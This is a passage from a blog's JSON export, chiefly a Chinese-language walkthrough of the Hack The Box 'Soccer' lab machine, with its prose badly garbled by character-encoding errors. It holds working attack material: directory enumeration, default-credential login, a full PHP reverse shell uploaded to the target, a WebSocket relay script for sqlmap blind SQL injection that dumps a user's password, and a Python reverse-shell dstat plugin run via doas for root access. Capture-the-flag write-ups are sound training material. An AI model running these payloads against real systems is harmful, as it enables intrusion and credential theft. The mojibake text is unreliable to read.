80ç«¯å£HTTPæœåŠ¡åŸŸåä¸ºsoccer.htbï¼Œå°†åŸŸåè§£ææ¡ç›®æ·»åŠ åˆ°hostsæ–‡ä»¶ echo \"10.10.11.194 soccer.htb\" &gt;&gt; /etc/hosts æµè§ˆå™¨è®¿é—®soccer.htbï¼Œå¸¸è§„æ€è·¯è§‚å¯Ÿé¡µé¢ã€çœ‹æºç ï¼Œæ²¡ä¸œè¥¿ gobusteræ‰«ç›®å½•ï¼ˆPSï¼šé¾Ÿé€Ÿdirbè¿˜æ˜¯å°‘ç”¨ï¼‰ â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢] â””â”€# gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.4 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.4 [+] Timeout: 10s =============================================================== 2023/02/06 07:27:43 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 162] /.htpasswd (Status: 403) [Size: 162] Progress: 13324 / 20470 (65.09%)[ERROR] 2023/02/06 07:35:14 [!] Get \"http://soccer.htb/our-blog\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 13333 / 20470 (65.13%)[ERROR] 2023/02/06 07:35:15 [!] Get \"http://soccer.htb/out\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 13408 / 20470 (65.50%)[ERROR] 2023/02/06 07:35:21 [!] Get \"http://soccer.htb/p7ap\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14609 / 20470 (71.37%)[ERROR] 2023/02/06 07:36:13 [!] Get \"http://soccer.htb/producttags\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14614 / 20470 (71.39%)[ERROR] 2023/02/06 07:36:14 [!] Get \"http://soccer.htb/profiles\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14625 / 20470 (71.45%)[ERROR] 2023/02/06 07:36:17 [!] Get \"http://soccer.htb/promoted\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14652 / 20470 (71.58%)[ERROR] 2023/02/06 07:36:21 [!] Get \"http://soccer.htb/proplayer\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14707 / 20470 (71.85%)[ERROR] 2023/02/06 07:36:25 [!] Get \"http://soccer.htb/prototype\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) /tiny (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/] Progress: 20469 / 20470 (100.00%) =============================================================== 2023/02/06 07:40:00 Finished =============================================================== æ‰«å¾—http://soccer.htb/tiny/ï¼Œæµè§ˆå™¨è®¿é—®ï¼Œæ˜¯ä¸ªç™»å½•ç•Œé¢ ä¸‹æ–¹æœ‰ä¸ªè¶…é“¾æ¥ï¼šâ€”â€” Â© CCP Programmers â€”â€”ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œå°±æ˜¯ç™»å½•é¡µé¢çš„æ ‡é¢˜ã€‚ Githubæœ‰é»˜è®¤ç”¨æˆ·åå’Œå¯†ç  é»˜è®¤ç”¨æˆ·å/å¯†ç : admin/admin@123 user/12345 ç”¨adminç”¨æˆ·ç™»å½•è¿›æ¥ï¼Œæµè§ˆé¡µé¢ï¼Œæœ‰ä¸ªä¸Šä¼ ç‚¹ï¼Œé‚£å½“ç„¶æ˜¯è¯•è¯•èƒ½ä¸èƒ½ä¸Šä¼ ä¸ªåå¼¹shellã€‚è¯•æ¥è¯•å»ï¼Œå‘ç°åˆšè¿›æ¥çš„ä¸»ç•Œé¢æ˜¯/var/www/htmlç›®å½•ï¼Œæ­£å¸¸çš„wwwæœåŠ¡ç›®å½•ï¼Œä¸Šä¼ çš„è¯åªä¼šä¸Šä¼ åˆ°å½“å‰æ‰€åœ¨ç›®å½•ï¼Œè€Œä¸”åªæœ‰tiny/uploadsç›®å½•ä¸‹å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚ç”±äºé¶åœºç¯å¢ƒä¼šéš”å‡ åˆ†é’Ÿåˆ·æ–°ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ–‡ä»¶ç•™å­˜ä¸äº†å¤ªä¹…ï¼Œå»ºè®®ä¸Šä¼ ä¹‹å‰å°±å¼€å¥½ç›‘å¬ nc -nvlp 3030 #ç«¯å£æ”¹æˆè‡ªå·±è„šæœ¬å¯¹åº”çš„ åå¼¹shellè„šæœ¬å¦‚ä¸‹ï¼Œæ³¨æ„ä¿®æ”¹ipä¸ºè‡ªå·±çš„vpnç¯å¢ƒçš„ipï¼ˆifconfigå‘½ä»¤çœ‹tun0ç½‘å¡ipï¼‰ å‚è€ƒhttps://github.com/Cyberw1ng/Bug-Bounty/blob/main/rev_shell.php &lt;?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.16.6'; // CHANGE THIS $port = 3030; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"pipe\", \"w\") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?&gt; ä¸Šä¼ æˆåŠŸ URLæ é‡Œè®¿é—®Shellæ–‡ä»¶https://www.soccer.htb/tiny/uploads/ReverseShell.php ç›‘å¬æ¥æ”¶åˆ°shellå“åº” è·å–bashï¼Œä¹Ÿå°±æ˜¯è½¬æ¢æˆäº¤äº’å¼shell æ­¤æ—¶æˆ‘ä»¬å…ˆçœ‹homeç›®å½•ï¼Œçœ‹æœ‰å“ªäº›ç”¨æˆ·ï¼Œç„¶åå‘ç°/home/playerç›®å½•ä¸‹æœ‰ä¸ªuser.txtï¼Œä½†www-dataç”¨æˆ·æ— è®¿é—®æƒé™ ç„¶åæ¥çœ‹ngnixçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨/etc/nginx/sites-enabledå‘ç°å­åŸŸåsoc-player.soccer.htbï¼Œè¿™å­åŸŸåä¹Ÿå¯ä»¥åœ¨/etc/hostså‘ç° å†æ¬¡æ·»åŠ åŸŸåè§£ææ¡ç›®è¿›hostsæ–‡ä»¶ï¼Œç„¶åæµè§ˆå™¨è®¿é—®ï¼Œå¦‚ä¸‹å¯çœ‹åˆ°ã€Matchã€‘ã€ã€Loginã€‘ã€ã€Signupã€‘å­—æ®µ echo \"10.10.11.194 soc-player.soccer.htb\" &gt;&gt; /etc/hosts Matché¡µé¢æ²¡ä»€ä¹ˆä¸œè¥¿ é‚£æˆ‘ä»¬å°±è¯•è¯•ã€Singnupã€‘æ³¨å†Œä¸ªè´¦æˆ·ï¼Œæ³¨å†ŒæˆåŠŸ ç„¶åç™»å½• ç™»å½•æˆåŠŸï¼Œè·³è½¬åˆ°ä¸€ä¸ªç¥¨æ®æ£€æŸ¥é¡µé¢ æŸ¥çœ‹æºç ï¼Œç”¨äº†WebSocket è¿™é‡Œæœå¯»äº†å¤§ä½¬çš„æ€è·¯ï¼Œå‚è€ƒï¼šAutomating Blind SQL injection over WebSocketï¼Œå¯ä»¥åˆ©ç”¨WebSocketï¼Œå®æ–½SQLæ³¨å…¥ã€‚åœ¨ä»»æ„ä½ç½®æ–°å»ºä»¥ä¸‹è„šæœ¬æ–‡ä»¶ from http.server import SimpleHTTPRequestHandler from socketserver import TCPServer from urllib.parse import unquote, urlparse from websocket import create_connection ws_server = \"ws://soc-player.soccer.htb:9091/\" def send_ws(payload): ws = create_connection(ws_server) # If the server returns a response on connect, use below line #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here # For our case, format the payload in JSON message = unquote(payload).replace('\"','\\'') # replacing \" with ' to avoid breaking JSON structure data = '{\"id\":\"%s\"}' % message ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return '' def middleware_server(host_port,content_type=\"text/plain\"): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -&gt; None: self.send_response(200) try: payload = urlparse(self.path).query.split('=',1)[1] except IndexError: payload = False if payload: content = send_ws(payload) else: content = 'No parameters specified!' self.send_header(\"Content-type\", content_type) self.end_headers() self.wfile.write(content.encode()) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever() print(\"[+] Starting MiddleWare Server\") print(\"[+] Send payloads in http://localhost:8081/?id=*\") try: middleware_server(('0.0.0.0',8081)) except KeyboardInterrupt: pass å…ˆè¿è¡Œè„šæœ¬ï¼Œåå¼€å¯sqlmap sqlmap -u \"http://localhost:8081/?id=1\" æ­»æ´»æµ‹ä¸å‡ºæ¥ï¼Œåé¢å‡çº§sqlmapï¼Œè¿˜ä¸è¡Œï¼Œç›¯äº†ä¸¤å¤©ï¼Œçœ‹äº†å¥½å‡ ä¸ªå¤§ä½¬çš„æ€è·¯ï¼Œç¡®å®šè¿™ä¸ªsqlæ³¨å…¥æ˜¯å¿…ç»ä¹‹è·¯ï¼Œæ— å¥ˆï¼Œåªèƒ½ç™½å«–å¤§ä½¬çš„æ³¨å…¥ç»“æœï¼ˆå¦‚æœ‰å¤§ä½¬æœ‰æ€è·¯ï¼Œçƒ¦è¯·æŒ‡ç‚¹ä¸€äºŒï¼‰ sqlmap -u â€œhttp://localhost:8081/?id=\" sqlmap -u â€œhttp://localhost:8081/?id=\" --current-db sqlmap -u â€œhttp://localhost:8081/?id=\" -D soccer_db --tables sqlmap -u \"http://localhost:8081/?id=\" -D soccer_db -T accounts --dump +------+-------------------+----------+----------------------+ | id | email | username | password | +------+-------------------+----------+----------------------+ | 1324 | player@player.htb | player | PlayerOftheMatch2022 | +------+-------------------+----------+----------------------+ ç„¶åSSHè¿ä¸Šè¿™ä¸ªplayerç”¨æˆ· æ¥ä¸‹æ¥å°±æ˜¯ææƒï¼Œæˆ‘ä»¬ç”¨doaså’Œdstatè”åŠ¨ææƒ doasï¼šä»¥å…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥å¯¹å…¶è¿›è¡Œè®¾å®šï¼Œèµ‹äºˆæŒ‡å®šä½¿ç”¨è€…æ‰§è¡Œç‰¹å®šæŒ‡ä»¤çš„æƒé™ã€‚ dstatï¼šç”¨äºç”Ÿæˆç³»ç»Ÿèµ„æºç»Ÿè®¡ä¿¡æ¯çš„å¤šåŠŸèƒ½å·¥å…·ã€‚ å…³é”®ç‚¹å°±åœ¨äºç”¨æˆ·å¯ä»¥ç»™dstatæ·»åŠ æŸ¥çœ‹ç³»ç»Ÿèµ„æºçš„è„šæœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬æ–‡ä»¶ä¸­åˆ©ç”¨socketæ¥å»ºç«‹è¿æ¥ï¼Œä»è€Œè·å–shellã€‚ æˆ‘ä»¬ç”¨ä¸‹åˆ—æŸ¥æ‰¾å‘½ä»¤ï¼Œå¯ä»¥å‘ç°é¶æœºåŒ…å«dstatå·¥å…· find / -type d -name dstat 2&gt;/dev/null æ³¨ï¼šç”±äºfindåœ¨åŒ¹é…æŸ¥æ‰¾è¿‡ç¨‹ä¸­ï¼Œä¼šæœ‰éƒ¨åˆ†ç›®å½•æ— å¯è¯»æƒé™ï¼Œä»è€Œä¼šäº§ç”Ÿâ€œPermission deniedâ€çš„é”™è¯¯æç¤ºï¼Œæ­¤å¤„â€œ2&gt;/dev/nullâ€æ˜¯ä¸ºäº†è¿‡æ»¤æ‰è¿™äº›æç¤ºï¼Œç®€åŒ–è¾“å‡ºç»“æœã€‚â€œ2&gt;/dev/nullâ€è¡¨ç¤ºé‡å®šå‘é”™è¯¯æç¤ºä¿¡æ¯ï¼ˆstderrï¼‰åˆ°â€œ/dev/nullâ€ï¼Œâ€œ/dev/nullâ€æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„ç©ºè®¾å¤‡ã€‚ å¯ä»¥çœ‹åˆ°dstatæ–‡ä»¶çš„æ ¼å¼éƒ½æ˜¯dstat_*.py å®˜æ–¹ç»™å‡ºçš„å¯èƒ½åŒ…å«å¤–éƒ¨dstat_*.pyæ’ä»¶çš„ç›®å½•æœ‰å¦‚ä¸‹å‡ ä¸ª ~/.dstat/ (path of binary)/plugins/ /usr/share/dstat/ /usr/local/share/dstat/ æˆ‘ä»¬å¯ä»¥åœ¨/usr/local/share/dstatç›®å½•æ–°å»ºdstat_wa0er.pyï¼Œå†…å®¹å¦‚ä¸‹ import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.15\",3030)); #æ­¤å¤„ipåŠç«¯å£ä¾ç„¶å¯¹åº”å¼€å¯ç›‘å¬çš„ä¸»æœºå’Œç«¯å£ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/sh\") å¼€å¯ç«¯å£ç›‘å¬ nc -nvlp 3030 å€ŸåŠ©doasï¼Œä»¥rootèº«ä»½æ‰§è¡Œdstatå‘½ä»¤ï¼Œä»è€Œæ‰§è¡Œdstat_wa0er.py doas -u root /usr/bin/dstat --wa0er å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸæ‹¿åˆ°rootæƒé™ å‚è€ƒSoccer â€” Hack The Box Hack The Box â€” Soccer Machine Simple Writeup by Karthikeyan Nagaraj Automating Blind SQL injection over WebSocket NodeJS WebSocket SQLi vulnerable WebApp doas dstat","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"Hello World","slug":"Hello-World","date":"2022-03-08T12:10:39.000Z","updated":"2022-03-08T12:26:37.055Z","comments":true,"path":"posts/4a17b156.html","link":"","permalink":"https://wa0er.github.io/posts/4a17b156.html","excerpt":"","text":"#include&lt;stdio.h&gt; int main() { printf(\"Hello World!!!\\n\"); return 0; }","categories":[{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/categories/Hello-World/"}],"tags":[{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/tags/Hello-World/"}],"author":"wa0er"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/categories/Hello-World/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"},{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/tags/Hello-World/"}]}